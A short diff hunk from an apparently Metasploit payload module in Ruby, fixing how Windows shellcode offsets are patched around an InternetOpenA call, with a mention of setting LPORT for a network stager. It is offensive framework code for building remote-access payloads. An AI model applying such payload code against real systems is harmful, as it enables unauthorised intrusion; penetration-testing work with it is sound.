@@ -129,7 +129,7 @@ module Metasploit3
     jmphost_loc = p.index("\x68\x3a\x56\x79\xa7\xff\xd5") + 8 # push 0xA779563A        ; hash( "wininet.dll", "InternetOpenA" ) ; call ebp
     p[jmphost_loc, 4] = [p[jmphost_loc, 4].unpack("V")[0] - jmp_offset].pack("V")
     #patch call Internetopen
-    p[p.length - 4, 4] = [p[p.length - 4, 4].unpack("l")[0] + jmp_offset].pack("V")
+    p[p.length - 4, 4] = [p[p.length - 4, 4].unpack("V")[0] + jmp_offset].pack("V")
 
     # patch the LPORT
     lport = datastore['LPORT']
